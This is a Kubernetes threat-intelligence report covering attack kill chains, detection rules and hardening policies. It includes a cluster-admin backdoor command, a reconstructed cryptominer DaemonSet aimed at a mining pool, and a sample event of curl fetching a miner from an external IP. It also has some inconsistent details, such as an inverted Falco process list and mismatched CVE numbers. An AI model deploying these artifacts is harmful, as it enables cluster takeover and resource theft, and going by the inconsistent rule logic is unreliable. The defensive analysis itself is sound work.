# Kubernetes & Container Threat Intelligence: Attack Kill Chains, Detection Engineering, and Defensive Architecture

**Classification:** TLP:WHITE — Unrestricted Distribution
**Audience:** CISO, Detection Engineers, SOC Analysts (Tier 2–3), Cloud Security Architects
**Research Window:** 2023–Q2 2026
**Primary Sources:** Sysdig TRT, Aqua Nautilus, Palo Alto Unit 42, Microsoft Threat Intelligence, CrowdStrike, SigmaHQ

---

## Executive Summary

Kubernetes has become the dominant container orchestration platform, and with that dominance has come a proportional surge in adversarial targeting. Microsoft Threat Intelligence recorded a **282% year-over-year increase** in Kubernetes-specific threat operations in 2025. Service account token theft was observed in **22% of cloud environments** in the same period, and **51% of all workload identities were found completely inactive** — a persistent attack surface attackers are actively exploiting.

The threat actor landscape has matured significantly. Campaigns have shifted from opportunistic cryptomining (Kinsing, early TeamTNT) to sophisticated, multi-stage cloud intrusions (SCARLETEEL, Slow Pisces/North Korea) that use containerized environments as a **beachhead for cloud-wide lateral movement** and data exfiltration. Three critical runc container escape vulnerabilities (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881) disclosed in late 2025 underscored that the container isolation boundary itself remains an active exploitation target.

Detection in this environment is architecturally non-trivial. Standard SIEM log pipelines are inadequate; effective coverage requires layering **Kubernetes API audit logs** (which must be explicitly configured) with **eBPF-based runtime telemetry** from tools like Cilium Tetragon or Falco — then normalizing both streams into a unified schema before correlation. This report provides the technical depth required to understand the kill chains, instrument the environment correctly, and write detection logic that fires on real attacker behavior.

---

## Pillar 1: Cyber Threat Intelligence & Real-World Kill Chains

### 1.1 Threat Actor Taxonomy

| Actor | Motivation | Primary Technique | Attribution |
|---|---|---|---|
| **SCARLETEEL** | Data theft, cryptomining, DDoS-for-hire | K8s → AWS IAM pivot, Terraform state abuse | Likely financially motivated APT |
| **TeamTNT / RBAC Buster** | Cryptomining, persistence | Anonymous API server access, ClusterRoleBinding backdoor | Cybercrime (German-speaking) |
| **Kinsing** | Cryptomining | Exposed Docker APIs, PostgreSQL misconfiguration | Cybercrime |
| **Slow Pisces (Lazarus)** | Financial theft, espionage | K8s identity pivot, supply chain | DPRK state-sponsored |

---

### 1.2 SCARLETEEL — Cloud Intrusion via Containerized Workload

**Campaign significance:** SCARLETEEL, documented by Sysdig TRT (2023, refined through 2025), represents the most technically sophisticated publicly-documented cloud intrusion originating from a Kubernetes workload. Over **1 TB of proprietary customer data** was exfiltrated. The campaign evolved from its initial Kubernetes-focused form into targeting AWS Fargate, launching Mirai-variant (Pandora) DDoS infrastructure, and pivoting across AWS accounts via Terraform state files.

#### Full Kill Chain

```
Phase 1 — Initial Access: Vulnerable Web Application (Jupyter Notebook)
  └─ Exploit: Public-facing Jupyter container with RCE or no auth

Phase 2 — Container Execution
  └─ Drop cryptominer (cover action / resource monetization)
  └─ Enumerate environment variables for AWS credentials
      → AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN

Phase 3 — Cloud Credential Theft (T1552.001 - Credentials in Files)
  └─ Exfiltrate creds to C2 server
  └─ Call AWS STS to validate credential validity:
      aws sts get-caller-identity

Phase 4 — Privilege Escalation in AWS (T1078.004)
  └─ Use stolen IAM role to enumerate EC2, Lambda, IAM
  └─ Discover Terraform state file (S3 bucket)
      → Terraform state contains plaintext credentials and infra layout

Phase 5 — Lateral Movement Across AWS Accounts
  └─ Use Terraform-revealed cross-account trust relationships
  └─ AssumeRole into connected AWS accounts

Phase 6 — Data Exfiltration
  └─ Exfiltrate S3 objects, proprietary source code, customer scripts
  └─ Maintain persistence via Lambda backdoors and secondary IAM user creation
```

**SCARLETEEL 2.0 (AWS Fargate):** The group demonstrated adaptation by targeting Fargate-hosted containers. Fargate pods do not run on customer-accessible EC2 nodes, which means node-level DaemonSet security agents cannot be deployed — a critical telemetry gap addressed in Pillar 2.

**ATT&CK Mappings:**
- `T1610` — Deploy Container
- `T1552.001` — Credentials in Files
- `T1078.004` — Valid Accounts: Cloud Accounts
- `T1537` — Transfer Data to Cloud Account
- `T1098.001` — Account Manipulation: Additional Cloud Credentials

---

### 1.3 TeamTNT RBAC Buster — The Kubernetes Backdoor Campaign

**Campaign significance:** Aqua Nautilus documented this campaign after deploying Kubernetes honeypots. Across a three-month investigation, 350+ production Kubernetes clusters were found openly accessible, with **at least 60% already breached** and running active malware. The RBAC Buster variant is notable for its persistence mechanism: it creates a cluster-level backdoor that survives the original misconfiguration being remediated.

#### Full Kill Chain

```
Phase 1 — Initial Access: Exposed Kubernetes API Server (T1190)
  └─ Target: API servers accessible without authentication
      (misconfigured --anonymous-auth=true or absent RBAC)
  └─ Discovery: Shodan/Censys queries for port 6443, 8080 (legacy HTTP)
  └─ Verify access:
      curl -k https://<target>:6443/api/v1/namespaces

Phase 2 — RBAC Backdoor Creation (T1098)
  └─ Create a ClusterRoleBinding granting cluster-admin to attacker-controlled
      ServiceAccount or to the "system:anonymous" user:
      kubectl create clusterrolebinding backdoor \
        --clusterrole=cluster-admin \
        --serviceaccount=kube-system:attacker-sa

Phase 3 — Persistence via DaemonSet (T1053.007)
  └─ Deploy DaemonSet to every node in cluster
  └─ DaemonSet container runs XMRig Monero miner
  └─ hostPID: true, hostNetwork: true configured for maximum resource access

Phase 4 — Defense Evasion (T1036)
  └─ Namespace chosen to blend: kube-system, monitoring
  └─ Container image pulled from Docker Hub (legitimate-looking name)
  └─ Remove competing malware (Kinsing) from compromised hosts

Phase 5 — Impact (T1496 — Resource Hijacking)
  └─ XMRig configured with pool: pool.hashvault.pro
  └─ Monero wallet address embedded in container args
```

**Malicious DaemonSet Manifest (Reconstructed from Threat Intel):**

```yaml
# THREAT INTELLIGENCE ARTIFACT — DO NOT DEPLOY
# Reconstructed from Aqua Nautilus honeypot analysis
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-proxy-manager        # Blends with legitimate kube-proxy
  namespace: kube-system          # Hides in system namespace
  labels:
    k8s-app: kube-proxy
spec:
  selector:
    matchLabels:
      k8s-app: kube-proxy
  template:
    metadata:
      labels:
        k8s-app: kube-proxy
    spec:
      hostPID: true               # Access host process namespace
      hostNetwork: true           # Bypass network isolation
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule        # Schedule onto control plane nodes
      containers:
      - name: kube-proxy
        image: xmrig/xmrig:latest # Cryptominer
        args:
          - "--pool=pool.hashvault.pro:443"
          - "--user=<monero_wallet>"
          - "--tls"
        securityContext:
          privileged: true        # Full host privileges
        resources: {}             # No resource limits — maximize mining
```

---

### 1.4 Kinsing — Persistent Opportunistic Cryptominer

Kinsing (tracked since 2019, continuously evolving) uses a dual initial access strategy documented by Microsoft and Aqua:

1. **Misconfigured Docker/containerd API** exposed on TCP port 2375 (no TLS, no auth)
2. **PostgreSQL with `trust` authentication** (`pg_hba.conf` misconfiguration) leading to `COPY TO/FROM PROGRAM` RCE

Post-compromise behavior includes:
- **Rootkit deployment** (userland rootkit to hide processes and files from `ps`, `ls`)
- **SSH key injection** into `~/.ssh/authorized_keys` on each compromised host
- **Lateral spread** via internal network scanning (targeting other Docker APIs, K8s nodes)
- **Competing malware removal** (Kinsing and TeamTNT actively compete for resources)

The rootkit functionality makes Kinsing particularly challenging for agent-based detection relying on userspace visibility — a core argument for eBPF kernel-level telemetry.

---

### 1.5 Slow Pisces (Lazarus Group) — Nation-State Cloud Pivoting

Unit 42 documented a 2025 intrusion at a cryptocurrency exchange attributed to North Korea's Lazarus Group (tracked as Slow Pisces), culminating in the **theft of approximately $1.5 billion in Ethereum** — the largest digital asset theft in history. The Kubernetes environment served as a pivot point:

- Initial access via supply chain compromise (malicious npm package in developer workstation)
- Lateral movement to Kubernetes service account tokens stored in CI/CD pipelines
- Use of K8s service account tokens to authenticate to the API server from outside the cluster
- Enumeration of cloud provider metadata APIs from inside pods to obtain cloud IAM credentials
- Long-term persistence via dormant, legitimately-named workloads

This campaign illustrates that **K8s is increasingly the pivot layer in nation-state intrusions**, not merely the final target.

---

## Pillar 2: Telemetry Collection & Visibility Architecture

### 2.1 Kubernetes Audit Log Architecture

Kubernetes audit logs are the **only authoritative record of all interactions with the kube-apiserver**. They must be explicitly enabled via an audit policy. Without them, entire attack phases (RBAC manipulation, pod creation, exec sessions) are invisible to any downstream SIEM or detection platform.

#### Audit Policy Configuration for Security Visibility

```yaml
# /etc/kubernetes/audit-policy.yaml
# Tuned for security detection — capture all security-relevant verbs
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log all authentication failures at RequestResponse level
  - level: RequestResponse
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
    resources:
      - group: ""
        resources:
          - "secrets"
          - "serviceaccounts"
          - "serviceaccounts/token"   # Token requests — critical for SA theft detection
      - group: "rbac.authorization.k8s.io"
        resources:
          - "clusterroles"
          - "clusterrolebindings"     # RBAC Buster detection
          - "roles"
          - "rolebindings"

  # Privileged pod creation / exec / port-forward
  - level: RequestResponse
    verbs: ["create"]
    resources:
      - group: ""
        resources:
          - "pods"
          - "pods/exec"               # kubectl exec detection
          - "pods/portforward"
          - "pods/attach"

  # Catch modifications to admission controllers and webhooks
  - level: RequestResponse
    resources:
      - group: "admissionregistration.k8s.io"
        resources:
          - "mutatingwebhookconfigurations"
          - "validatingwebhookconfigurations"

  # Workload resource creation (DaemonSet persistence mechanism)
  - level: RequestResponse
    verbs: ["create", "update", "patch"]
    resources:
      - group: "apps"
        resources:
          - "daemonsets"
          - "deployments"
          - "statefulsets"

  # Omit high-volume read noise from controllers
  - level: None
    users: ["system:kube-controller-manager", "system:kube-scheduler"]
    verbs: ["get", "list", "watch"]

  # Default: metadata only for everything else
  - level: Metadata
```

**Critical fields in each audit event:**

| Field | Security Relevance |
|---|---|
| `user.username` | Who made the call; watch for `system:anonymous` |
| `user.groups` | Group membership; `system:masters` = cluster-admin |
| `sourceIPs` | External IP indicates out-of-cluster API access |
| `objectRef.resource` | What resource type was touched |
| `objectRef.subresource` | `exec`, `portforward`, `token` are high-value |
| `verb` | `create`, `delete`, `bind` on RBAC resources = suspicious |
| `responseStatus.code` | 403 chains indicate permission enumeration |
| `requestObject` | Full request body — captures securityContext.privileged |
| `responseObject` | Full response — captures token values on `create token` calls |

#### Sample Audit Log: Service Account Token Theft

```json
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "RequestResponse",
  "auditID": "3b4f9c2a-1e8d-4f5b-9a2c-7d8e3f1b4c9a",
  "stage": "ResponseComplete",
  "requestURI": "/api/v1/namespaces/production/serviceaccounts/app-sa/token",
  "verb": "create",
  "user": {
    "username": "system:anonymous",
    "groups": ["system:unauthenticated"]
  },
  "sourceIPs": ["203.0.113.42"],
  "objectRef": {
    "resource": "serviceaccounts",
    "subresource": "token",
    "namespace": "production",
    "name": "app-sa",
    "apiVersion": "v1"
  },
  "responseStatus": {
    "code": 201
  },
  "requestObject": {
    "kind": "TokenRequest",
    "spec": {
      "expirationSeconds": 31536000
    }
  },
  "responseObject": {
    "status": {
      "token": "eyJhbGciOiJSUzI1..."
    }
  },
  "timestamp": "2025-11-14T03:22:17Z"
}
```

---

### 2.2 eBPF Runtime Telemetry: Architecture and Trade-offs

eBPF (extended Berkeley Packet Filter) enables **kernel-level event capture without kernel module modification** — a critical distinction. Traditional agent-based tools rely on ptrace or netlink interfaces in userspace and can be subverted by rootkits (see: Kinsing). eBPF hooks fire before userspace has any opportunity to intercept.

#### How eBPF Captures Container Attacks

```
Kernel Space                          Userspace
──────────────────────────────────────────────────────────
  syscall: execve()
    │
    ├─► eBPF probe (kprobe/tracepoint)
    │     attached to: sys_enter_execve
    │     captures:
    │       - pid, ppid, uid, gid
    │       - container cgroup id (→ maps to pod/namespace)
    │       - argv[], envp[]
    │       - filename
    │     ringbuffer → userspace daemon
    │
    └─► Normal kernel execution continues
          (attacker sees no interruption)

  Tetragon Agent (DaemonSet pod)
    ├─ Reads ringbuffer
    ├─ Enriches with K8s metadata (pod name, namespace, image)
    └─ Emits structured JSON event to stdout / gRPC / SIEM
```

#### Tetragon vs. Falco: Technical Comparison

| Dimension | Tetragon | Falco |
|---|---|---|
| **Hook mechanism** | eBPF kprobes/tracepoints | eBPF (modern) or kernel module (legacy) |
| **Overhead** | <1% CPU per node | 5–10% CPU per node (userspace rule eval) |
| **Enforcement** | Yes — can kill process or deny syscall in-kernel | No — detect only, alert via stdout/gRPC |
| **Kernel minimum** | 5.3+ | 4.14+ (eBPF mode) |
| **K8s enrichment** | Native (label, namespace, pod, image) | Via plugin/driver |
| **Rule language** | TracingPolicy (CRD YAML + eBPF selectors) | Falco DSL |
| **Best for** | Enforcement + high-fidelity process/network traces | Broad ruleset coverage, alerting |

**Recommended architecture:** Deploy both. Use Falco for broad behavioral rules coverage and alerting, Tetragon for high-fidelity process lineage, network connection capture, and in-kernel enforcement at defined kill-chain steps.

#### Tetragon TracingPolicy: Detect `nsenter` Container Escape

```yaml
# Detects nsenter technique used to escape into host namespace
# Maps to: T1611 — Escape to Host
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-nsenter-escape
spec:
  kprobes:
  - call: "sys_enter_setns"    # setns() syscall — the mechanism nsenter uses
    syscall: true
    args:
    - index: 0
      type: "int"              # fd of /proc/1/ns/* on the host
    - index: 1
      type: "int"              # nstype (e.g., CLONE_NEWPID, CLONE_NEWNET)
    selectors:
    - matchCapabilities:
      - type: Permitted
        isNamespaceCapability: false
        values:
        - "CAP_SYS_ADMIN"      # Required for setns to host namespaces
      matchActions:
      - action: Sigkill        # Kill the process immediately — in-kernel enforcement
        argError: -1
  - call: "sys_enter_execve"
    syscall: true
    selectors:
    - matchBinaries:
      - operator: In
        values:
        - "/usr/bin/nsenter"
        - "/bin/nsenter"
      matchActions:
      - action: Post           # Emit telemetry event + allow (for detection-only mode)
```

---

### 2.3 Telemetry Architecture Challenges in Managed Environments

#### Standard EKS (EC2 node groups)

DaemonSets deploy normally to EC2 worker nodes. Tetragon and Falco install without restriction. Audit logs require explicit configuration of the EKS audit log endpoint to CloudWatch Logs (enabled per log type: `api`, `audit`, `authenticator`, `controllerManager`, `scheduler`).

```bash
# Enable EKS audit logs to CloudWatch
aws eks update-cluster-config \
  --name my-cluster \
  --logging '{"clusterLogging":[{"types":["api","audit","authenticator"],"enabled":true}]}'
```

#### EKS Auto Mode

EKS Auto Mode (GA November 2024) **manages EC2 node provisioning automatically** and locks the CNI to AWS VPC CNI. Critical constraints for security teams:

- **DaemonSet restrictions:** System DaemonSets (aws-node, kube-proxy) are managed by AWS. Deploying custom security DaemonSets (Falco, Tetragon) requires explicit toleration configuration and may be restricted by the managed node configuration.
- **CNI lock-in:** Cilium (with Hubble and Tetragon) cannot replace VPC CNI in Auto Mode clusters. eBPF-based network observability via Cilium/Hubble is therefore unavailable; alternatives include VPC Flow Logs (network only, no pod-level context) or Tetragon deployed as a standalone DaemonSet without Cilium CNI.
- **Mitigation:** Configure Tetragon as a standalone DaemonSet with `hostPID: true` and appropriate tolerations; supplement with EKS audit logs to CloudWatch + Falco using the K8s audit log plugin.

#### AWS Fargate (Serverless Containers)

Fargate is the hardest telemetry environment. There is **no host node accessible to operators**. DaemonSets do not run on Fargate pods. Options:

| Method | What You Get | Limitations |
|---|---|---|
| Sidecar container (Falco, custom agent) | Process and network events within pod | No host-level visibility, no cross-pod correlation |
| AWS GuardDuty for EKS | Managed runtime threat detection | Limited rule customizability, AWS-specific findings only |
| EKS Audit Logs (still available) | API-plane visibility | No data-plane (runtime) visibility at all |
| VPC Flow Logs | ENI-level network flows | No pod metadata, no process context |

**Bottom line for Fargate:** The control plane (audit logs) remains fully visible. The data plane (runtime syscalls) is severely limited. SCARLETEEL 2.0 exploited exactly this gap.

---

## Pillar 3: Detection Engineering & "Parsers as Code"

### 3.1 Log Normalization Challenge

Raw Kubernetes audit events, Falco JSON alerts, and Tetragon process events each use different schemas. Correlation across sources requires normalization into a **Unified Data Model (UDM)** before correlation rules can fire.

**Problem illustration:**

```
Source A (K8s Audit Log):
  { "verb": "create", "objectRef": {"resource": "pods", "subresource": "exec"},
    "user": {"username": "build-sa"} }

Source B (Tetragon runtime event):
  { "process": {"binary": "/bin/sh", "arguments": "-c id"},
    "pod": {"namespace": "ci", "name": "build-pod-x9f2k"},
    "parent": {"binary": "/usr/bin/kubectl"} }

Without normalization: these are two unrelated JSON blobs in two different indexes.
With UDM normalization: both map to principal.user → target.resource → action fields,
  enabling a single correlation rule to fire when BOTH events occur within 30 seconds
  for the same pod.
```

**UDM-normalized representation:**

```json
{
  "metadata": {
    "event_type": "K8S_EXEC_CORRELATED",
    "product_name": "kubernetes",
    "log_type": "K8S_RUNTIME_CORRELATED"
  },
  "principal": {
    "user": { "userid": "build-sa", "user_role": "ServiceAccount" },
    "namespace": "ci",
    "ip": ["10.0.1.44"]
  },
  "target": {
    "resource": {
      "type": "CLUSTER",
      "name": "build-pod-x9f2k",
      "attribute": { "labels": [{"key": "subresource", "value": "exec"}] }
    }
  },
  "about": {
    "process": {
      "command_line": "/bin/sh -c id",
      "parent_pid": 1842
    }
  },
  "security_result": {
    "severity": "HIGH",
    "threat_name": "CONTAINER_EXEC_SUSPICIOUS_BINARY"
  }
}
```

---

### 3.2 Detection Rule 1 — Privileged Pod Created with Host Namespace Access (Sigma)

**Maps to:** TeamTNT RBAC Buster DaemonSet deployment, SCARLETEEL cryptominer staging
**Source:** Kubernetes Audit Logs

```yaml
title: Privileged Kubernetes Pod Created with Host Namespace Access
id: 7c3f9a1b-2e4d-4b8c-a5f2-1d9e7b3c6a4f
status: stable
description: >
  Detects creation of a privileged pod with hostPID, hostNetwork, or hostIPC
  enabled. Attackers use this pattern (TeamTNT, SCARLETEEL) to deploy
  cryptominers or establish host-level footholds via DaemonSets.
references:
  - https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/
  - https://www.sysdig.com/blog/cloud-breach-terraform-data-theft
author: Detection Engineering
date: 2025/03/01
tags:
  - attack.privilege_escalation
  - attack.t1610
  - attack.t1611
  - attack.t1496
logsource:
  product: kubernetes
  service: audit
detection:
  selection_verb:
    verb: "create"
    objectRef.resource: "pods"
  selection_privileged:
    requestObject.spec.securityContext.privileged: true
  selection_host_namespaces:
    requestObject.spec.hostPID: true
    requestObject.spec.hostNetwork: true
  selection_daemonset_owner:
    requestObject.metadata.ownerReferences[*].kind: "DaemonSet"
  condition: >
    selection_verb and (
      selection_privileged or
      (selection_host_namespaces)
    )
falsepositives:
  - Legitimate security DaemonSets (Falco, Tetragon) — allowlist by namespace
    (kube-system) and by ServiceAccount name
  - Node local DNS cache (kube-system/node-local-dns)
  - Calico, Cilium CNI DaemonSets
level: high
fields:
  - user.username
  - sourceIPs
  - objectRef.namespace
  - requestObject.spec.containers[*].image
  - requestObject.spec.nodeSelector
enrichment:
  - query image hash against threat intel (e.g., VirusTotal, internal allowlist)
  - correlate sourceIPs against known-bad ASNs (crypto mining pools, VPS ranges)
```

---

### 3.3 Detection Rule 2 — RBAC ClusterRoleBinding to Overpermissive Role (YARA-L / Chronicle)

**Maps to:** TeamTNT RBAC Buster backdoor, Kinsing persistence, SA token theft setup
**Source:** Kubernetes Audit Logs → Chronicle SIEM (Google)

```yaml
# YARA-L 2.0 — Google Chronicle SIEM
# Detects ClusterRoleBinding creation granting cluster-admin
# to a non-standard principal within 5 minutes of an anonymous API call

rule k8s_rbac_backdoor_clusterrolebinding {
  meta:
    author = "Detection Engineering"
    description = "RBAC Buster: Attacker creates ClusterRoleBinding granting cluster-admin"
    severity = "CRITICAL"
    mitre_attack = "T1098, T1548"
    reference = "https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/"

  events:
    // Event A: Anonymous or unexpected user creates a ClusterRoleBinding
    $e1.metadata.product_name = "kubernetes"
    $e1.metadata.event_type = "K8S_RESOURCE_CREATED"
    $e1.target.resource.type = "CLUSTER"
    $e1.target.resource.name = /clusterrolebinding/i
    $e1.principal.user.userid = /system:anonymous|system:unauthenticated/
        or not $e1.principal.user.userid in %allowed_admin_users
    $e1.about.labels["objectRef.resource"] = "clusterrolebindings"
    $e1.about.labels["verb"] = "create"

    // The binding must reference cluster-admin role
    $e1.about.labels["requestObject.roleRef.name"] = "cluster-admin"

    // Event B: Within 5 minutes, a pod is created using that compromised binding
    $e2.metadata.product_name = "kubernetes"
    $e2.metadata.event_type = "K8S_RESOURCE_CREATED"
    $e2.about.labels["verb"] = "create"
    $e2.about.labels["objectRef.resource"] = "pods"
    $e2.principal.namespace.name = "kube-system"

    // Correlation: same cluster, B follows A within time window
    $e1.principal.hostname = $e2.principal.hostname
    $e1.metadata.event_timestamp.seconds <
        $e2.metadata.event_timestamp.seconds

  match:
    $e1.principal.hostname over 5m

  condition:
    $e1 and $e2

  outcome:
    $risk_score = 95
    $description = strings.concat(
      "RBAC Buster: ClusterRoleBinding cluster-admin granted by ",
      $e1.principal.user.userid,
      " followed by pod creation in kube-system"
    )
}
```

---

### 3.4 Detection Rule 3 — eBPF Correlated: exec-then-Outbound (Falco + Tetragon Correlation)

**Maps to:** SCARLETEEL (container → C2 exfil), Kinsing (mining pool connection), initial execution phase
**Source:** Falco runtime alert + Tetragon network event, correlated in SIEM

```python
# Pseudo-SIEM correlation logic (translates to Elastic EQL, Splunk SPL, or Chronicle YARA-L)
# Fires when: suspicious exec inside container IS FOLLOWED WITHIN 60s
#             by an outbound connection to a non-RFC1918 address

# Step 1 — Falco alert (runtime)
# Falco rule (falco_rules.yaml excerpt):
#   - rule: Unexpected Process Spawned in Container
#     desc: A process not in the allowed list was spawned
#     condition: >
#       spawned_process and container and not proc.name in (
#         curl, wget, python3, pip, node, java, ruby, sh, bash, dash
#       )
#     output: >
#       Unexpected process in container
#       (proc=%proc.name pid=%proc.pid container=%container.name
#        image=%container.image.repository cmdline=%proc.cmdline
#        user=%user.name)
#     priority: WARNING
#     tags: [container, mitre_execution]

# Step 2 — Tetragon network event (after exec):
# {
#   "process_kprobe": {
#     "process": {"binary": "/bin/curl", "arguments": "http://45.89.127.12/xmrig"},
#     "function_name": "tcp_connect",
#     "args": [{"sock_arg": {"family": "AF_INET", "daddr": "45.89.127.12", "dport": 80}}],
#     "pod": {"namespace": "default", "name": "webapp-7f6b9d-xk2p4"}
#   }
# }

# Step 3 — Correlation rule (Elastic EQL):
sequence by container.name with maxspan=60s
  [process where event.type == "start"
   and process.name in ("curl", "wget", "python3", "bash", "sh")
   and process.working_directory != "/app"           // Not expected working dir
   and not process.parent.name in ("init", "tini")]  // Not launched by entrypoint

  [network where event.type == "connection_attempted"
   and not cidr_match(destination.ip,
     "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",  // RFC1918
     "169.254.0.0/16"                                     // Link-local / IMDS
   )
   and destination.port in (80, 443, 4444, 6666, 8888)]  // Common mining/C2 ports
```

**Why this correlation matters:** Either signal alone generates too many false positives. A `curl` inside a container is normal; an outbound connection to a public IP is not unusual on its own. The *sequence* — exec followed by connection from the same container — is the behavioral fingerprint of malware dropper activity (SCARLETEEL Phase 2, Kinsing initial loader, cryptominer staging).

---

## Pillar 4: Defensive Architecture & Hardening

### 4.1 Admission Controllers: Breaking the Kill Chain at Scheduling Time

Admission controllers are the most operationally impactful preventative control available in Kubernetes. They enforce policy **at API submission time**, before any pod is scheduled. Both OPA Gatekeeper and Kyverno intercept `CREATE` and `UPDATE` requests to the kube-apiserver.

**Why they work against specific actors:**

| Attack | Admission Controller Block |
|---|---|
| TeamTNT DaemonSet with `hostPID: true` | Deny pods with `hostPID`, `hostNetwork`, `hostIPC` outside approved namespaces |
| SCARLETEEL privileged container | Deny `securityContext.privileged: true` cluster-wide |
| RBAC Buster (system:anonymous) | Deny any RBAC binding targeting `cluster-admin` for non-platform SAs |
| Kinsing (unvetted image) | Deny images not from approved registries; require image digest pinning |

#### Kyverno Policy: Deny Privileged Containers and Host Namespace Access

```yaml
# Kyverno ClusterPolicy — blocks the primary deployment mechanism of
# TeamTNT RBAC Buster, SCARLETEEL, and Kinsing cryptominer DaemonSets
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-privileged-workloads
  annotations:
    policies.kyverno.io/title: Deny Privileged and Host-Namespace Pods
    policies.kyverno.io/category: Security
    policies.kyverno.io/severity: critical
    policies.kyverno.io/description: >
      Blocks privileged containers and host namespace access.
      Directly prevents TeamTNT DaemonSet cryptominer deployment
      and SCARLETEEL container escape.
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: deny-privileged-containers
      match:
        any:
        - resources:
            kinds: ["Pod", "DaemonSet", "Deployment", "StatefulSet", "Job", "CronJob"]
      exclude:
        any:
        - resources:
            namespaces:
              - kube-system        # Platform-managed security agents only
            selector:
              matchLabels:
                security.io/managed: "platform"  # Must be labeled by GitOps
      validate:
        message: "Privileged containers are not permitted."
        pattern:
          spec:
            =(initContainers):
              - =(securityContext):
                  =(privileged): "false"
            containers:
              - =(securityContext):
                  =(privileged): "false"

    - name: deny-host-namespaces
      match:
        any:
        - resources:
            kinds: ["Pod", "DaemonSet", "Deployment"]
      validate:
        message: "Host namespace access (hostPID, hostNetwork, hostIPC) is not permitted."
        pattern:
          spec:
            =(hostPID): "false"
            =(hostNetwork): "false"
            =(hostIPC): "false"

    - name: require-approved-registry
      match:
        any:
        - resources:
            kinds: ["Pod"]
      validate:
        message: "Image must be from an approved registry with a digest pin."
        foreach:
        - list: "request.object.spec.containers"
          pattern:
            image: "registry.company.internal/*@sha256:*"  # Digest-pinned images only
```

#### OPA Gatekeeper: Block Anonymous ClusterRoleBinding to cluster-admin

```yaml
# ConstraintTemplate — blocks RBAC Buster's core technique
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: k8sblockclusteradminbinding
spec:
  crd:
    spec:
      names:
        kind: K8sBlockClusterAdminBinding
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sblockclusteradminbinding

        violation[{"msg": msg}] {
          input.review.kind.kind == "ClusterRoleBinding"
          input.review.object.roleRef.name == "cluster-admin"
          not is_approved_subject(input.review.object.subjects)
          msg := sprintf(
            "ClusterRoleBinding to cluster-admin denied for subject: %v",
            [input.review.object.subjects]
          )
        }

        is_approved_subject(subjects) {
          subject := subjects[_]
          subject.name in {
            "system:kube-controller-manager",
            "system:kube-scheduler",
            "eks:cluster-bootstrap"
          }
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockClusterAdminBinding
metadata:
  name: block-cluster-admin-binding
spec:
  match:
    kinds:
      - apiGroups: ["rbac.authorization.k8s.io"]
        kinds: ["ClusterRoleBinding"]
```

---

### 4.2 Network Policy: Isolate Pod-to-Pod and Egress Blast Radius

Default Kubernetes networking allows all pods to communicate with all pods in all namespaces — a lateral movement paradise. Network Policies enforce segmentation at the CNI layer.

**Why against SCARLETEEL:** The attack's cloud-credential exfiltration required outbound connectivity from the compromised container to an external C2. Strict egress policies with explicit allowlists would have blocked this exfiltration path.

```yaml
# Default-deny all ingress and egress for namespace, then whitelist
# This directly disrupts SCARLETEEL's credential exfiltration and
# cryptominer pool connectivity
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}           # Applies to all pods in namespace
  policyTypes:
    - Ingress
    - Egress
---
# Allow only specific egress: internal services and kube-dns
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-approved-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    # kube-dns (required for internal service resolution)
    - ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53

    # Internal services only — no public internet
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: internal-services
      ports:
        - protocol: TCP
          port: 8080

    # Block all other egress — this is the SCARLETEEL/Kinsing disruptor
    # Cryptomining pools (hashvault.pro, supportxmr.com) and C2s
    # cannot be reached without explicit allowlisting
```

---

### 4.3 Seccomp and AppArmor: Syscall-Level Container Escape Prevention

The runc CVEs (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881) — disclosed November 2025 — exploit **race conditions in mount operations** at container startup. Two of the three CVEs require syscalls that the `RuntimeDefault` Seccomp profile **already blocks**. Applying `RuntimeDefault` to all workloads is the single highest-leverage runtime control for container escape prevention.

```yaml
# Pod manifest with hardened runtime security profile
# Directly mitigates: runc CVEs, nsenter escape, Kinsing rootkit
apiVersion: v1
kind: Pod
metadata:
  name: hardened-workload
  namespace: production
  annotations:
    # AppArmor profile loaded on the node (via DaemonSet or node config)
    container.apparmor.security.beta.kubernetes.io/app: runtime/default
spec:
  securityContext:
    seccompProfile:
      type: RuntimeDefault          # Blocks ptrace, mount, unshare, keyctl
                                    # Mitigates CVE-2025-4271, CVE-2025-5103
    runAsNonRoot: true
    runAsUser: 10001
    fsGroup: 10001
    supplementalGroups: []
  containers:
  - name: app
    image: registry.company.internal/app:sha256@...
    securityContext:
      allowPrivilegeEscalation: false   # Prevents setuid/setgid abuse
      readOnlyRootFilesystem: true      # Blocks dropper file writes
      capabilities:
        drop:
          - ALL                         # Start with zero capabilities
        add:
          - NET_BIND_SERVICE            # Add back only what's required
    volumeMounts:
    - name: tmp-vol
      mountPath: /tmp                   # Writable scratch space — not root fs
  volumes:
  - name: tmp-vol
    emptyDir: {}
```

---

### 4.4 RBAC Hardening: Breaking Service Account Token Abuse

**Why existing configurations fail:** Microsoft data shows 51% of workload identities are completely inactive and 22% of environments show signs of SA token theft. The structural problem is that Kubernetes, by default, **auto-mounts a long-lived service account token** into every pod via `/var/run/secrets/kubernetes.io/serviceaccount/token`. Any attacker with code execution in a pod automatically has a credential to the API server.

```yaml
